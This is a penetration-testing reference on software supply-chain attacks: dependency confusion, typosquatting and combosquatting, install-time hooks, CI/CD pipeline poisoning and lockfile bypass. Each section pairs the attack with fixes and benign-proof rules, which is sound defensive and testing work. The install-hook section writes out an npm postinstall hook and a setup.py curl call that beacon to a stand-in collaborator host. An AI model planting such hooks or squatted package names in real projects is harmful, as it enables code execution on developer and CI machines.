# Software supply-chain attack reference  (OWASP A06 · MITRE ATT&CK T1195)
# Approval-gated. BENIGN proof only (lab resolver preference OR an OOB callback from a TEST package's hook).
# Never publish a usable internal name on a public index, ship a real payload, or poison a prod pipeline.
# Tester-owned names only; unpublish/revert everything staged. In-scope namespaces/registries only.

## Threat model
A build or install step runs code and pulls code from places the developer only partly controls: public
registries, internal registries, mirrors, CI runners, and the lockfiles that pin them. Each is a trust
boundary an attacker can cross to land code on a developer box, a CI runner, or every consumer of a package.
The classes below are the reachable sinks.

## 1. Dependency confusion (substitution)  — T1195.001 / .002
Cause: a resolver that can reach BOTH a private index and a public one, with no namespace binding, picks the
"best" candidate by version across all configured indexes. An internal package name that ALSO exists on the
public index at a higher version is pulled from the public index instead of the private one.
- Surface: internal import/require names in leaked manifests, lockfiles, `package.json` `dependencies`,
  `requirements.txt`, build logs, or SBOMs that are NOT present on the public registry.
- pip: multiple `--index-url` / `--extra-index-url` entries are searched and the highest version wins
  regardless of which index it came from (the classic exposure). npm: an unscoped internal name with no
  private binding. RubyGems: multiple `source` lines without a scoped `source ... do ... end` block.
- BENIGN proof: in a LAB with the same multi-index config, register a tester-owned package under the internal
  name at a very high version (e.g. `9.9.9`) on a PRIVATE test index, then show `pip install` / `npm install`
  resolves to the tester package — capture the resolve/download log. Do NOT register the real internal name
  on the real public registry.
- Fix: a private `index-url` as the ONLY source (not `extra-index-url`); scoped namespaces (`@org/pkg`) bound
  to the private registry; `.npmrc` / `pip.conf` pinning the registry; defensively pre-register internal names.

## 2. Typosquatting / brandjacking  — T1195.002
A public package whose name is one edit from a popular one (`reqeusts`, `python3-dateutil`,
`electorn`), or that mimics an internal name's public form, catches typos and copy-paste errors.
- Surface: fuzzy neighbours of names in the manifest; recently-published look-alikes; names matching an
  internal project a developer might expect on the public index.
- BENIGN proof: show a look-alike is installable and that a plausible typo resolves to it; for any tester demo
  use a tester-owned name — never stage a deceptive name other users could install by accident.
- Fix: allow-list dependencies; pin exact names + versions + hashes; registry monitoring for look-alikes.

## 3. Malicious install hooks (code-exec at install)  — T1195.001
Package managers run package-supplied code during install — the execution primitive behind confusion and
typosquat packages. Once a package resolves, the hook runs on the developer/CI box with their privileges and
network:
- Python: `setup.py` executes on `pip install` from an sdist; `cmdclass` / `build` overrides run arbitrary code.
- npm: `preinstall` / `install` / `postinstall` lifecycle scripts in `package.json` run automatically.
- RubyGems: `extconf.rb` / native-extension build runs on install.
- BENIGN proof: a TEST package you own whose hook performs ONLY a harmless beacon — a DNS/HTTP request to the
  engagement OOB collaborator carrying a non-secret marker (a hostname tag). No file reads, no env/secret
  exfil, no persistence. The callback proves install-time code execution and egress.
- Fix: `npm ci --ignore-scripts` / `pip install --only-binary=:all:` (wheels don't run `setup.py`); vet
  scripts; sandboxed, network-restricted build runners; a dependency firewall/proxy.

## 4. CI/CD pipeline + artifact poisoning  — T1195.002
The pipeline is itself a dependency. Reachable sinks:
- Poisoned pipeline execution (PPE): attacker-influenced CI config (`.github/workflows`, `.gitlab-ci.yml`,
  `Jenkinsfile`) or a referenced build script runs attacker code with CI credentials/secrets.
- Unpinned CI actions/images: `uses: some/action@main` or a `:latest` base image pulls mutable, replaceable code.
- Artifact poisoning: a writable artifact store / loosely-keyed cache / mirror lets an attacker swap a built
  artifact between build and deploy.
- Build-cache / dependency-cache poisoning: a shared cache keyed loosely accepts an attacker-seeded entry.
- BENIGN proof: in an authorized test pipeline, show an unpinned action/script/cache is attacker-influenceable
  by having a TEST step emit an OOB beacon — never exfil real CI secrets; redact anything sensitive observed.
- Fix: pin actions/images by immutable digest (`@sha256:...`); least-privilege CI tokens; signed artifacts +
  provenance (SLSA); isolate untrusted PR builds from secrets; tightly-keyed, authenticated caches.

## 5. Lockfile / integrity-hash bypass
Lockfiles (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `yarn.lock`) pin versions and integrity hashes
so a swapped artifact is rejected. Bypasses:
- No lockfile, or an install that ignores it (`npm install` adding a new transitive dep; `--no-frozen-lockfile`).
- Hashes present for direct deps but not transitive ones, or a resolver configured to re-resolve.
- A registry/mirror that can return different bytes for the same version (installs without `--require-hashes`).
- BENIGN proof: show that with the project's real install command a version/source NOT matching the lock is
  accepted (e.g. a lab mirror serves a tester build at the locked version and install does not reject it).
- Fix: commit lockfiles; `npm ci` / `pip install --require-hashes` / `poetry install --sync`; hash-pin
  transitive deps; verify signatures; a single trusted, read-through-cached registry.

## Benign-proof rules (all classes)
- Prove either RESOLUTION (the resolver prefers the attacker name/version — lab/private index) or EXECUTION
  (an OOB callback from a TEST package's install hook). One is enough.
- Marker only: a non-secret tag over DNS/HTTP to the engagement collaborator. No secret/file/env exfil.
- Never leave a usable attacker package under a real internal name on a public registry; unpublish/yank and
  record cleanup. Keep deceptive names out of shared indexes entirely.
- Tools (names only): `pip` / `npm` / `gem`, registry search APIs, `syft` / `grype`, OWASP Dependency-Check,
  an OOB/collaborator service. These enumerate and prove; they do not need a real payload.

---

## Extended arsenal — combosquatting & name-permutation surface

Combosquatting = a REAL popular name plus a plausible extra token, so the eye accepts it:
`requests-oauth`, `python-requests`, `lodash-utils`, `aws-sdk-core`, `@org-internal/utils`.
```
# Normalisation collisions — spellings a resolver folds to ONE name (or fails to, letting a near-form live):
#   pip (PEP 503): foo.bar == foo_bar == Foo-Bar  (dots/underscores/case normalised) -> squat a near-form
#   npm: names are lowercased; scope confusion @org-name vs @orgname vs org-name (unscoped) = different pkgs
#   hyphen<->underscore swaps, trailing digits, singular/plural, locale-style suffixes
# Seed candidate names FROM the target (don't guess): internal import/require strings, lockfiles, SBOMs,
#   build logs, Docker layers, stack traces, error pages — any internal name NOT on the public index.
# Lab-only check that a name is unclaimed (read-only metadata query, NO publish):
#   npm view <name>            # 404 = unclaimed on npm
#   pip index versions <name>  # or the registry JSON API
#   gem search -r <name>
```
- BENIGN proof: stage ONLY a tester-owned combosquat on a PRIVATE lab index; never place a deceptive
  real-looking name on a shared/public registry where another user could install it by accident.

---

## Extended arsenal — ecosystem resolver & source precedence

| Ecosystem | Resolution rule | Attacker-favouring quirk | Hardening that removes it |
|---|---|---|---|
| npm / yarn / pnpm | unscoped name -> default (public) registry unless a scope is bound | internal unscoped name has no private binding | `@scope:registry=` in `.npmrc`; publish internal only under that scope |
| pip | all `--index-url` + `--extra-index-url` searched, HIGHEST version wins across them | public `9.9.9` beats private `1.2.3` of the same name | single `--index-url` (private proxy); `--require-hashes` |
| RubyGems / Bundler | multiple top-level `source` lines = one multi-source pool | gem resolvable from ANY listed source | scoped `source "..." do ... end`; `disable_multisource` |
| Maven | repositories declared in POMs/settings all consulted | a dependency POM can inject an attacker repo | mirror `*` to one proxy; Enforcer `requireNoRepositories` |
| Gradle | project-declared repos consulted in order | a build file adds a public repo | `FAIL_ON_PROJECT_REPOS`; `verification-metadata.xml` |
| Go | `GOPROXY` list (`proxy,direct`), checked vs the checksum DB + `go.sum` | public proxy answers a private module path | `GOPRIVATE`/`GONOSUMDB` for private prefixes + a private `GOPROXY` |
| NuGet | all configured feeds searched | internal ID also on nuget.org | package source mapping (ID pattern -> feed) |
| Cargo | crates.io unless replaced | internal crate name on crates.io | `[source] crates-io replace-with = "<mirror>"` |

```
# LAB resolution proof (no install side effects) — show WHICH source/version would win:
#   pip install --dry-run --report rep.json -i <priv> --extra-index-url <pub> <pkg> ; jq .install rep.json
#   npm install --dry-run <pkg> --loglevel verbose        # logs the resolved registry + version
#   go: GOFLAGS=-mod=mod go get -n <module>                # dry resolution against the proxy chain
# Go note: a module path is a DOMAIN you must control to confuse (harder than a flat name) — report honestly.
```

---

## Extended arsenal — install & build-time execution hooks (multi-ecosystem)

| Ecosystem | Code-exec trigger | Fires on | Notable |
|---|---|---|---|
| npm | `preinstall`/`install`/`postinstall` + `prepare` | `npm install` AND `npm ci` | `--ignore-scripts` disables; `node-gyp`/`binding.gyp` native build also runs |
| pip (sdist) | `setup.py` / PEP 517 build backend | build/install from a source dist | wheels DON'T run this on install |
| pip (wheel) | import-time code in `__init__.py` | first `import` | fallback when wheels block install hooks |
| RubyGems | `extconf.rb` / native-extension build | `gem install` with a C ext | |
| Maven | plugin goals, lifecycle bindings | `mvn <phase>` | the build file IS code |
| Gradle | `build.gradle` / `settings.gradle` / `~/.gradle/init.d` | any Gradle invocation | init scripts run for EVERY build on the box |
| Go | `//go:generate`, cgo, `*_test.go` | `go generate` / `go test` (NOT plain `go build`) | `go build` not running dep code = a defensive property |
| .NET | MSBuild `.targets`/`.props`, build tasks | `dotnet build`/`restore` | PackageReference can inject build logic |

```
# BENIGN proof of install-time exec — a TEST package YOU own whose hook does ONLY a marker beacon:
#   npm  package.json: "scripts":{"postinstall":"node -e \"require('dns').lookup('TAG.<oob>',()=>{})\""}
#   pip  setup.py:     subprocess.run(["curl","-s","http://TAG.<oob>/"])    # TAG = non-secret engagement tag
# NO file reads, NO env/secret exfil, NO persistence. A DNS/HTTP hit at the collaborator = install-time
#   code-exec + egress proven. UNPUBLISHED: lab/private index only; yank/unpublish after; never public.
```

---

## Extended arsenal — CI/CD pipeline exposure (PPE variants, runner & token abuse)  — OWASP CICD-SEC-4 · MITRE T1677

| PPE variant | Attacker edits | Runs because |
|---|---|---|
| Direct | the pipeline config itself (`.github/workflows/*`, `.gitlab-ci.yml`, `Jenkinsfile`) on a branch/PR | the config author also controls the build definition |
| Indirect | a file the pipeline EXECUTES (Makefile, test, lint, build script, `pre-commit`) | config calls attacker-influenced code |
| Public | a fork pull request that triggers the pipeline | a public repo runs unreviewed contributor code |

```
# GitHub Actions sharp edges:
#   pull_request_target = runs with repo SECRETS + base-branch workflow, but attacker controls the PR tree
#     -> dangerous ONLY when combined with an explicit checkout of the PR head + running its code.
#   Script injection: untrusted ${{ github.event.pull_request.title/body/head.ref }} interpolated into a
#     run: block -> shell injection. Fix: pass via env: then reference "$VAR" (no inline interpolation).
#   GITHUB_TOKEN over-permissive -> restrict top-level  permissions: { contents: read }.
#   Unpinned actions (uses: x/y@main) / :latest images = mutable code -> pin by commit SHA / @sha256 digest.
# Self-hosted runners: non-ephemeral = persistence + env secrets + pivot into the internal network;
#   never attach a self-hosted runner to a public repo accepting fork PRs. Use ephemeral, isolated runners.
# GitLab: $CI_JOB_TOKEN scope, protected variables only on protected branches, isolate fork pipelines.
```
- BENIGN proof: in an AUTHORIZED test pipeline, show an unpinned action/script/runner is attacker-influenceable
  by a TEST step emitting an OOB marker — NEVER exfil real CI secrets; redact anything sensitive observed.
- Hardening: pin by immutable digest, least-priv tokens, ephemeral runners, OIDC short-lived creds, signed
  artifacts + provenance (SLSA), environment protection rules, isolate untrusted-PR builds from secrets.

---

## Extended arsenal — lab harness & known-good control (benign-only proof protocol)

```
# Stand up a PRIVATE index so no attacker-named package ever touches a public registry:
#   npm -> verdaccio ;  pip -> devpi / pypiserver ;  gem -> geminabox / `gem server` ;  maven -> a lab Nexus
#   point the client at the SAME multi-index config the target uses + an OOB collaborator for hook beacons.
# KNOWN-GOOD CONTROL (run FIRST, or there is no finding):
#   1. baseline: install with ONLY the trusted/private source -> the legit internal package resolves. Log it.
#   2. introduce the real-world misconfig (add the public extra-index / unscoped name / unpinned source).
#   3. re-install -> the TEST package wins. The DELTA between 1 and 3 is the vulnerability; without step 1
#      you cannot rule out "it would have pulled the private package anyway".
# Proof is ONE of:
#   RESOLUTION — resolve/download log shows the attacker name/version/source preferred (dry-run suffices), OR
#   EXECUTION  — a TEST package's hook fires an attributable OOB marker (DNS/HTTP, non-secret tag).
```
- Cleanup ledger (cleanup.md): yank/unpublish every staged package, tear down the lab index, confirm NOTHING
  attacker-named remains on any public registry, delete any transcript that captured a secret.
- Catalogued, NOT fired: publishing a real malicious package, registering a real internal name on a public
  index, poisoning a production pipeline/artifact, secret/file/env exfil — describe feasibility only.
